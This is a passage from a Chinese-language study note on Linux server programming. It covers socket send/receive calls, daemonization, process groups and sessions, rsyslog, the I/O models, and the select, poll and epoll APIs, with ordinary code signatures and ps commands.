<li><code>addrlen</code>：目标地址结构体的大小</li>
</ul></li>
<li><p><code>recvfrom()</code></p>
<p>接收 UDP
数据报并保存到缓冲区中。成功则返回<strong>实际接收的字节数</strong>，失败则返回
<code>-1</code>。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> flags, </span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">struct</span> sockaddr *src_addr, <span class="type">socklen_t</span> *addrlen)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>sockfd</code>：套接字描述符</li>
<li><code>buf</code>：指向<strong>存放接收数据</strong>的缓冲区</li>
<li><code>len</code>：缓冲区大小</li>
<li><code>flags</code>：控制发送行为（一般为0）</li>
<li><code>src_addr</code>：存放发送地址的结构体指针</li>
<li><code>addrlen</code>：发送方地址结构体的大小</li>
</ul></li>
</ol>
<h4 id="通用数据读写">通用数据读写</h4>
<p>不仅能⽤于TCP流数据，也能⽤于UDP数据报</p>
<ol type="1">
<li><p><code>sendmsg</code></p>
<p>成功则返回发送的字节数，失败返回 <code>-1</code></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> msghdr *msg, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>sockfd</code>：套接字描述符。</li>
<li><code>msg</code>：指向 <strong><code>msghdr</code>
结构体</strong>，包含要发送的数据、目标地址、控制信息。</li>
<li><code>flags</code>：发送标志，如
<code>MSG_DONTWAIT</code>、<code>MSG_EOR</code>。</li>
</ul></li>
<li><p><code>recvmsg</code></p>
<p>成功则返回接收的字节数，失败返回 <code>-1</code></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="type">int</span> sockfd, <span class="keyword">struct</span> msghdr *msg, <span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<blockquote>
<p><code>msghdr</code>结构体详解</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">msghdr</span> {</span><br><span class="line">    <span class="type">void</span>         *msg_name;       <span class="comment">// 地址信息 (UDP：目标地址 / 源地址；对于⾯向连接的TCP协议，该成员没有意义)</span></span><br><span class="line">    <span class="type">socklen_t</span>     msg_namelen;    <span class="comment">// 地址长度</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iovec</span> *msg_iov;        <span class="comment">// 数据缓冲区数组</span></span><br><span class="line">    <span class="type">size_t</span>        msg_iovlen;     <span class="comment">// 数据缓冲区个数</span></span><br><span class="line">    <span class="type">void</span>         *msg_control;    <span class="comment">// 控制信息缓冲区</span></span><br><span class="line">    <span class="type">size_t</span>        msg_controllen; <span class="comment">// 控制信息长度</span></span><br><span class="line">    <span class="type">int</span>           msg_flags;      <span class="comment">// 消息标志</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<h3 id="总结">总结</h3>
<h4 id="服务端-tcp">服务端 (TCP)</h4>
<ol type="1">
<li><strong><code>socket()</code></strong>：创建套接字</li>
<li><strong><code>bind()</code></strong>：绑定 IP 地址和端口号</li>
<li><strong><code>listen()</code></strong>：监听客户端连接请求</li>
<li><strong><code>accept()</code></strong>：接受客户端连接</li>
<li><strong><code>send()</code> /
<code>recv()</code></strong>：读写数据</li>
<li><strong><code>close()</code></strong>：关闭套接字</li>
</ol>
<h4 id="客户端-tcp">客户端 (TCP)</h4>
<ol type="1">
<li><strong><code>socket()</code></strong>：创建套接字</li>
<li><strong><code>connect()</code></strong>：连接服务器</li>
<li><strong><code>send()</code> /
<code>recv()</code></strong>：读写数据</li>
<li><strong><code>close()</code></strong>：关闭套接字</li>
</ol>
<blockquote>
<p><strong>客户端</strong> 不调用 <code>bind()</code> 是为了
<strong>简化编程</strong> 和
<strong>方便操作系统自动分配端口</strong>。</p>
<p><strong>服务端</strong> 必须调用 <code>bind()</code> 来
<strong>指定监听的 IP 地址和端口号</strong>，以便
<strong>客户端能够连接</strong>。</p>
</blockquote>
<h2 id="高级io函数">高级I/O函数</h2>
<p><code>pipe</code>、<code>dup</code>、<code>readv</code>、<code>sendfile</code>、<code>mmap</code>、<code>tee</code>、<code>fcntl</code></p>
<p><code>splice</code>：用于在两个文件描述符之间移动数据，而无需将数据从内核空间复制到用户空间，<strong>直接在内核空间</strong>中完成数据的传输。。它通常用于高效地将数据从一个文件描述符（例如管道、socket
或文件）传输到另一个文件描述符。核心原理是它利用了 Linux
内核的<strong>零拷贝（Zero-Copy）技术</strong></p>
<h2 id="linux服务器程序规范">Linux服务器程序规范</h2>
<p><strong>AF_UNIX Socket 类型</strong></p>
<ul>
<li><strong>AF_UNIX</strong> 是一种本地进程间通信（IPC）的 Socket
类型，也称为 <strong>Unix Domain Socket (UDS)</strong>。</li>
<li>它用于 <strong>同一台机器</strong>
上不同进程之间的通信，不涉及网络传输。</li>
<li>通信数据不会经过网络协议栈，因此
<strong>效率高、延迟低、开销小</strong>。</li>
</ul>
<h3 id="日志">日志</h3>
<ul>
<li><p><code>rsyslog</code> 是 Linux
系统中功能强大的日志管理工具，具有高性能、模块化、支持多种协议和格式化输出的特点。</p></li>
<li><p><strong>rsyslogd 守护进程</strong> 在接收到
<strong>用户进程</strong> 或 <strong>内核</strong>
输入的日志后，会按照配置文件中的规则，将它们输出到特定的
<strong>日志文件</strong> 中。</p></li>
</ul>
<p>下面是<strong>日志处理流程</strong></p>
<ol type="1">
<li><p><strong>日志收集</strong>：</p>
<ul>
<li><p><strong>用户进程日志</strong>：通过调用 <code>syslog()</code>
函数，将日志写入 <code>/dev/log</code>（AF_UNIX Socket）。</p>
<blockquote>
<ul>
<li><p><strong><code>syslog()</code></strong> 是 C
语言标准库中的一个函数，用于
<strong>向系统日志发送消息</strong>。</p></li>
<li><p>日志通过 <strong>AF_UNIX Socket</strong> 发送到
<code>/dev/log</code> 文件，由 <code>rsyslogd</code>
或其他系统日志守护进程收集、处理并写入日志文件。</p></li>
<li><p>典型用途：记录程序运行状态、错误信息、安全事件等，便于调试和维护</p></li>
</ul>
</blockquote></li>
<li><p><strong>内核日志</strong>：通过 <code>klog</code>
模块从内核中收集日志，例如启动、硬件、中断等信息。</p></li>
</ul></li>
<li><p><strong>rsyslogd 获取日志</strong>：</p>
<ul>
<li><code>rsyslogd</code> 守护进程监听 <code>/dev/log</code> 和
<code>/proc/kmsg</code>（内核日志），获取日志数据。</li>
</ul></li>
<li><p><strong>日志过滤与分类</strong>：</p>
<ul>
<li>根据配置文件（如 <code>/etc/rsyslog.conf</code> 和
<code>/etc/rsyslog.d/*.conf</code>）中的规则进行过滤和分类。</li>
<li>规则由 Facility（日志来源） 和 Level（日志级别） 组成</li>
</ul></li>
<li><p><strong>日志输出与存储</strong>：</p>
<ul>
<li>日志被写入到指定的日志文件，如：
<ul>
<li><code>/var/log/messages</code>：系统通用日志</li>
<li><code>/var/log/secure</code>：认证和安全相关日志</li>
<li><code>/var/log/maillog</code>：邮件日志</li>
<li><code>/var/log/cron</code>：定时任务日志</li>
<li><code>/var/log/kern.log</code>：内核日志</li>
</ul></li>
<li>或者转发至 <strong>远程日志服务器</strong> 或
<strong>数据库</strong> 进行集中存储和分析。</li>
</ul></li>
</ol>
<h3 id="用户信息">用户信息</h3>
<p>EGID/EUID
存在的⽬的是⽅便资源访问，给运⾏⽬标程序的(组)⽤户提供有效(组)用户的权限。</p>
<blockquote>
<p>示例：</p>
<ul>
<li><p><strong><code>su</code> 程序</strong> 在
<strong>普通用户启动时</strong>，<strong>EUID 临时变为
<code>root</code></strong>，从而拥有 <code>root</code> 权限。</p></li>
<li><p>由于 SUID 位（即set-user-id 标志）被设置，则 <strong>EUID 变为
root</strong>，进程可以 <strong>访问和修改 <code>/etc/passwd</code>
文件</strong>，并执行切换用户的操作。</p></li>
</ul>
</blockquote>
<ol type="1">
<li><p>获取用户信息</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">uid_t</span> <span class="title">getuid</span><span class="params">(<span class="type">void</span>)</span></span>;   <span class="comment">// 获取 真实用户 ID (UID)</span></span><br><span class="line"><span class="function"><span class="type">uid_t</span> <span class="title">geteuid</span><span class="params">(<span class="type">void</span>)</span></span>;  <span class="comment">// 获取 有效用户 ID (EUID)</span></span><br><span class="line"><span class="function"><span class="type">gid_t</span> <span class="title">getgid</span><span class="params">(<span class="type">void</span>)</span></span>;   <span class="comment">// 获取 真实组 ID (GID)</span></span><br><span class="line"><span class="function"><span class="type">gid_t</span> <span class="title">getegid</span><span class="params">(<span class="type">void</span>)</span></span>;  <span class="comment">// 获取 有效组 ID (EGID)</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>设置用户信息</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setuid</span><span class="params">(<span class="type">uid_t</span> uid)</span></span>;       <span class="comment">// 设置 真实用户 ID 和 有效用户 ID</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">seteuid</span><span class="params">(<span class="type">uid_t</span> euid)</span></span>;     <span class="comment">// 设置 有效用户 ID</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setgid</span><span class="params">(<span class="type">gid_t</span> gid)</span></span>;       <span class="comment">// 设置 真实组 ID 和 有效组 ID</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">setegid</span><span class="params">(<span class="type">gid_t</span> egid)</span></span>;     <span class="comment">// 设置 有效组 ID</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="进程间关系">进程间关系</h3>
<h4 id="进程组">进程组</h4>
<ul>
<li>每个进程组都有一个唯一的 <strong>进程组 ID
(PGID)</strong>，用于标识该组中的所有进程。</li>
<li><strong>PGID（Process Group
ID）</strong>：进程组的唯一标识符，等于该组<strong>首领进程（Leader
Process）</strong> 的 PID（进程 ID）。</li>
<li><strong>首领进程</strong>：最先创建进程组的进程，PGID 等于它的
PID。如果首领进程退出，进程组不会消失，但其他进程的 PGID
不变。进程组将⼀直存在，直到其中<strong>所有进程</strong>都退出，或者加⼊到其他进程组。</li>
</ul>
<h4 id="会话">会话</h4>
<ul>
<li><p>一组相关的进程组组成一个会话，每个会话有一个唯一的
<strong>SID（Session ID）</strong>。</p></li>
<li><p><strong>Session ID
(SID)</strong>：会话的唯一标识符，等于会话首领进程（Session Leader）的
PID。</p></li>
<li><p><strong>会话首领进程</strong>：创建会话的进程，SID 等于它的
PID。这个进程可以成为<strong>守护进程</strong>。</p>
<blockquote>
<p><strong>调用进程不能是当前进程组的组长</strong>，否则会返回错误。这是因为：</p>
<ul>
<li>如果组长进程调用 <code>setsid()</code>，那么它的 <strong>PGID
(Process Group ID)</strong> 和 <strong>PID (Process ID)</strong>
相同，而 <code>setsid()</code>
要求调用进程成为<strong>新进程组的组长</strong>，即 <strong>PGID =
PID</strong>。如果它本身已经是组长，就无法改变 PGID，因此被禁止。</li>
</ul>
</blockquote></li>
</ul>
<h4 id="ps命令"><code>ps</code>命令</h4>
<p>用于<strong>查看系统中正在运行的进程</strong>。它可以显示进程的
PID、PPID、PGID、SID、TTY、状态、内存占用等详细信息。</p>
<ol type="1">
<li><p>查看所有进程的层级关系</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef --forest</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>查看会话、进程组和 PID 的关系</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -eo pid,ppid,pgid,sid,tty,stat,comm</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>查看当前 Shell 会话中的所有进程</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -o pid,ppid,pgid,sid,tty,stat,comm</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>查看前后台作业及进程</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -o pid,tty,stat,comm</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>查看某个用户的所有进程</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -u username</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="系统资源限制">系统资源限制</h3>
<ul>
<li><strong><code>getrlimit(int resource, struct rlimit \*rlim)</code></strong>：获取指定资源的<strong>软限制</strong>和<strong>硬限制</strong>。</li>
<li><strong><code>setrlimit(int resource, const struct rlimit \*rlim)</code></strong>：设置指定资源的<strong>软限制</strong>和<strong>硬限制</strong>。</li>
</ul>
<h3 id="改变目录">改变目录</h3>
<ol type="1">
<li><p>获取<strong>当前工作目录</strong>的<strong>绝对路径</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">getcwd</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> size)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>buf</code>：用于存储路径的缓冲区。</li>
<li><code>size</code>：缓冲区大小。</li>
<li>返回值：成功返回 <code>buf</code>；失败返回
<code>NULL</code>，并设置 <code>errno</code></li>
</ul></li>
<li><p>切换目录</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">chdir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>path</code>：目标目录的路径（绝对路径或相对路径）。</li>
<li>返回值：成功返回 <code>0</code>；失败返回 <code>-1</code>，并设置
<code>errno</code></li>
</ul></li>
</ol>
<h3 id="服务器程序后台化">服务器程序后台化</h3>
<ol type="1">
<li><strong>创建子进程</strong> 并退出父进程，防止继续占用
<strong>终端</strong>。</li>
<li><strong>调用 <code>setsid()</code></strong>：
<ul>
<li>创建新会话 (<code>session</code>)，并成为会话首进程。</li>
<li>成为新进程组的<strong>组长</strong>。</li>
<li><strong>脱离</strong> 控制终端。</li>
</ul></li>
<li><strong>重设文件权限掩码</strong>：
<ul>
<li>使用 <code>umask(0)</code> 确保子进程可以创建任何权限的文件。</li>
</ul></li>
<li><strong>更改工作目录</strong>：
<ul>
<li>通常切换到根目录：<code>chdir("/")</code>，防止
<strong>占用文件系统</strong>。</li>
</ul></li>
<li><strong>关闭文件描述符</strong>：
<ul>
<li>关闭 <strong>stdin, stdout, stderr</strong>
(<code>0, 1, 2</code>)，防止<strong>占用终端资源</strong>。</li>
</ul></li>
<li><strong>重定向文件描述符</strong>：
<ul>
<li>重定向 <code>stdin, stdout, stderr</code> 到
<strong><code>/dev/null</code></strong> 或
<strong>日志文件</strong>。</li>
</ul></li>
</ol>
<h2 id="io模型">I/O模型</h2>
<p>其中最重要的就是<strong>I/O复用</strong></p>
<h3 id="阻塞io">阻塞I/O</h3>
<p>进程发起 I/O
请求后，线程会一直阻塞，直到数据准备好并被复制到用户空间，I/O
操作才完成。</p>
<p><strong>流程</strong>：</p>
<ol type="1">
<li>进程调用 <code>read()</code>，如果数据未准备好，进程进入
<strong>阻塞状态</strong>。</li>
<li>内核等待数据准备好，并从内核缓冲区复制到用户空间。</li>
<li><code>read()</code> 返回，进程继续执行。</li>
</ol>
<h3 id="非阻塞io">非阻塞I/O</h3>
<p>进程发起I/O请求后，不管数据是否准备好都会直接返回。</p>
<p><strong>流程</strong>：</p>
<ol type="1">
<li>进程调用 <code>read()</code>：
<ul>
<li><strong>如果数据已准备好</strong>，<code>read()</code>
立即返回数据。</li>
<li><strong>如果数据未准备好</strong>，<code>read()</code> 立即返回
<code>-1</code>，并设置 <code>errno = EAGAIN</code>（不会阻塞）。</li>
</ul></li>
<li>进程通常会<strong>轮询</strong>（不断调用
<code>read()</code>）直到数据可用。</li>
</ol>
<h3 id="信号驱动io">信号驱动I/O</h3>
<p>让内核在 I/O 事件发生时发送信号 (<code>SIGIO</code>)
通知进程，进程在信号处理程序中执行 I/O 操作。</p>
<p><strong>流程</strong>：</p>
<ol type="1">
<li>进程调用 <code>fcntl()</code> 启用 <code>O_ASYNC</code>
标志，让内核在 I/O 事件发生时发送 <code>SIGIO</code> 信号。</li>
<li>进程继续执行其他任务，不阻塞。</li>
<li>当数据可用时，内核发送 <code>SIGIO</code> 信号。</li>
<li>信号处理函数调用 <code>read()</code> 读取数据。</li>
</ol>
<h3 id="异步io">异步I/O</h3>
<p>进程发起 I/O 请求后<strong>不会阻塞</strong>，内核在 I/O
操作完成后通知进程。</p>
<p><strong>流程</strong>：</p>
<ol type="1">
<li>进程调用 <code>aio_read()</code> 让内核执行 I/O 操作。</li>
<li>进程立即继续执行其他任务，不阻塞。</li>
<li>内核完成 I/O 后，主动通知进程（如回调函数或 <code>SIGEV</code>
机制）。</li>
<li>进程获取数据，I/O 操作完成。</li>
</ol>
<blockquote>
<p>异步I/O与信号驱动I/O的区别</p>
<p><strong>信号驱动 I/O (<code>SIGIO</code>)</strong>：</p>
<ul>
<li>只是<strong>提前通知</strong>进程 “数据可读”，但进程仍需
<code>read()</code> 获取数据。</li>
<li>适用于<strong>高并发网络 I/O</strong>（但现代高性能服务器一般用
<code>epoll</code>）。</li>
</ul>
<p><strong>异步 I/O (AIO)</strong>：</p>
<ul>
<li><strong>真正的异步</strong>，内核完成 I/O 后数据已就绪，无需
<code>read()</code>。</li>
<li>适用于<strong>高吞吐文件 I/O</strong>，如数据库、存储系统
(<code>io_uring</code> 适用于网络和文件)。</li>
</ul>
</blockquote>
<h3 id="io复用">I/O复用</h3>
<p>通过 <code>select()</code>、<code>poll()</code> 或
<code>epoll()</code> 让一个线程同时监视多个 I/O 事件，提高并发能力。</p>
<p><strong>流程</strong>：</p>
<ol type="1">
<li>进程调用
<code>select()</code>/<code>poll()</code>/<code>epoll_wait()</code>，等待多个文件描述符的状态变化。</li>
<li>如果某个描述符准备好，进程再去执行 <code>read()</code>。</li>
<li><code>read()</code>
仍然是阻塞的，但因为之前已经确认了数据可读，阻塞时间很短。</li>
</ol>
<h4 id="select">select</h4>
<p><code>select()</code> 函数是一种 <strong>I/O 多路复用</strong>
技术，它可以 <strong>同时监听多个文件描述符 (File Descriptor,
FD)</strong> 的状态。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, <span class="keyword">struct</span> timeval *timeout)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p>参数说明：</p>
<table>
<colgroup>
<col style="width: 15%">
<col style="width: 84%">
</colgroup>
<thead>
<tr class="header">
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>nfds</code></td>
<td>监听的最大文件描述符的值加 1（仅 Linux 需要，Windows
忽略此参数）。</td>
</tr>
<tr class="even">
<td><code>readfds</code></td>
<td>监听可读事件的文件描述符集合（可为 <code>NULL</code>）。</td>
</tr>
<tr class="odd">
<td><code>writefds</code></td>
<td>监听可写事件的文件描述符集合（可为 <code>NULL</code>）。</td>
</tr>
<tr class="even">
<td><code>exceptfds</code></td>
<td>监听异常事件的文件描述符集合（可为 <code>NULL</code>）。</td>
</tr>
<tr class="odd">
<td><code>timeout</code></td>
<td>设定超时时间，可为 <code>NULL</code>（表示无限等待）。</td>
</tr>
</tbody>
</table>
<p>select成功时返回就绪（可读、可写和异常）⽂件描述符的总数。如果在超时时间内没有任何⽂件描述符就绪，select将返回0。select失败时返回-1。</p>
<p>下面是<code>select</code>监听的文件操作符可能出现的状态：（<code>FD_ISSET</code>用于判断状态是否变化即是否就绪，例如<code>FD_ISSET(fd, &amp;readfds)</code>
用于检查某个文件描述符 (<code>fd</code>) 是否<strong>在
<code>readfds</code> 集合中被标记为可读</strong>。）</p>
<table>
<colgroup>
<col style="width: 25%">
<col style="width: 75%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">监听类型</th>
<th style="text-align: center;">触发条件</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><strong>可读
<code>readfds</code></strong></td>
<td style="text-align: center;">1. <code>socket</code> 有数据可读
<br>2. <code>accept()</code> 有新连接 <br>3. <code>read()</code>
返回 0（对端关闭） <br>4. 终端、管道、文件可读</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>可写
<code>writefds</code></strong></td>
<td style="text-align: center;">1. <code>socket</code> 发送缓冲区可用
<br>2. <code>connect()</code> 非阻塞模式完成 <br>3.
<code>write()</code> 不会阻塞</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>异常
<code>exceptfds</code></strong></td>
<td style="text-align: center;">1. <code>connect()</code> 失败 <br>2.
<code>MSG_OOB</code> <strong>带外数据</strong> <br>3. TCP 连接复位
(RST)</td>
</tr>
</tbody>
</table>
<blockquote>
<p><code>fd_set</code>：<strong>文件描述符（file
descriptor）集合</strong>，只能存 1024 个文件描述符</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *set)</span></span>;    <span class="comment">// 清空集合</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FD_SET</span><span class="params">(<span class="type">int</span> fd, fd_set *set)</span></span>;  <span class="comment">// 添加文件描述符</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="type">int</span> fd, fd_set *set)</span></span>;  <span class="comment">// 从集合中移除文件描述符</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FD_ISSET</span><span class="params">(<span class="type">int</span> fd, fd_set *set)</span></span>; <span class="comment">// 检查文件描述符是否准备就绪</span></span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<p>两种应用：</p>
<p><strong><code>select()</code> + 非阻塞
I/O（纯事件驱动模型）</strong>：</p>
<ul>
<li>适用于 <strong>高并发、轻量级连接</strong> 的场景，如
<strong>聊天室、HTTP 代理服务器</strong>。</li>
<li>无需多进程或多线程，<strong>单线程即可管理和处理多个连接</strong>。</li>
</ul>
<p><strong><code>select()</code> +
<code>fork()</code>（混合模型）</strong>：</p>
<ul>
<li>适用于 <strong>中小规模并发</strong> 且
<strong>每个连接需要较重业务处理</strong> 的场景，如
<strong>文件上传、数据计算</strong>。</li>
<li>通过 <strong>子进程避免阻塞主进程</strong>，简化了 <strong>I/O
操作的编程模型</strong>。</li>
</ul>
<h4 id="poll">poll</h4>
<p><code>poll()</code> 是 <code>select()</code> 的改进版，<strong>去除了
1024 个文件描述符（fd）的限制</strong>，但仍然需要遍历整个 fd
列表。poll系统调⽤的返回值的含义与select相同。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pollfd 结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pollfd</span> {</span><br><span class="line">    <span class="type">int</span> fd;         <span class="comment">// 监听的文件描述符</span></span><br><span class="line">    <span class="type">short</span> events;   <span class="comment">// 监听的事件（POLLIN-可读, POLLOUT-可写, POLLERR-错误）</span></span><br><span class="line">    <span class="type">short</span> revents;  <span class="comment">// 触发的事件（由内核填充）</span></span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>参数：</p>
<ul>
<li><code>fds</code>: <code>pollfd</code>
结构体数组，存放要监听的文件描述符及其事件。</li>
<li><code>nfds</code>: <code>fds</code> 数组的大小。</li>
<li><code>timeout</code>: 超时时间（毫秒），<code>-1</code>
表示无限等待，<code>0</code> 表示立即返回。</li>
</ul>
<h4 id="epoll">epoll</h4>
<p><code>epoll</code> 是 Linux 特有的 <strong>高效 I/O 复用</strong>
机制，适用于 <strong>高并发场景（如 1 万个 socket）</strong>。</p>
<p><strong>(1) <code>epoll_create()</code>
创建内核事件表（epoll实例）</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_create</span><span class="params">(<span class="type">int</span> flags)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><strong>创建内核事件表</strong>，返回 <code>epfd</code>（失败返回
<code>-1</code>）。</li>
</ul>
<p><strong>(2) <code>epoll_ctl()</code> 添加/删除/修改 fd（即管理
fd）</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// epoll_event 结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">epoll_event</span> {</span><br><span class="line">    <span class="type">uint32_t</span> events;  <span class="comment">// 监听的事件（EPOLLIN, EPOLLOUT 等，还包括EPOLLET-边缘触发模式）</span></span><br><span class="line">    <span class="type">epoll_data_t</span> data; <span class="comment">// 用户数据（通常存 fd）</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>epfd</code>: <code>epoll_create()</code> 返回的 epoll
句柄。</li>
<li><code>op</code>: 操作类型：
<ul>
<li><code>EPOLL_CTL_ADD</code>：添加 <code>fd</code>。</li>
<li><code>EPOLL_CTL_MOD</code>：修改 <code>fd</code> 监听的事件。</li>
<li><code>EPOLL_CTL_DEL</code>：删除 <code>fd</code>。</li>
</ul></li>
<li><code>fd</code>: 需要监听的文件描述符（socket）。</li>
<li><code>event</code>: 监听的事件。</li>
</ul>
<p><strong>(3) <code>epoll_wait()</code> 获取发生事件的 fd</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event *events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>epfd</code>: <code>epoll_create()</code> 返回的 epoll
句柄。</li>
<li><code>events</code>: 用于存储触发事件的 <code>epoll_event</code>
数组。</li>
<li><code>maxevents</code>: <code>events</code> 数组的大小（建议设置为
<code>10</code>~<code>1000</code>）。</li>
<li><code>timeout</code>: 超时时间（毫秒），<code>-1</code>
表示无限等待，<code>0</code> 表示立即返回。</li>
</ul>
<p><strong>(4) LT（水平触发）和ET（边缘触发）模式</strong></p>
<p>LT：只要数据未被读取，<code>epoll_wait()</code>
<strong>一直返回</strong> 可读事件。</p>
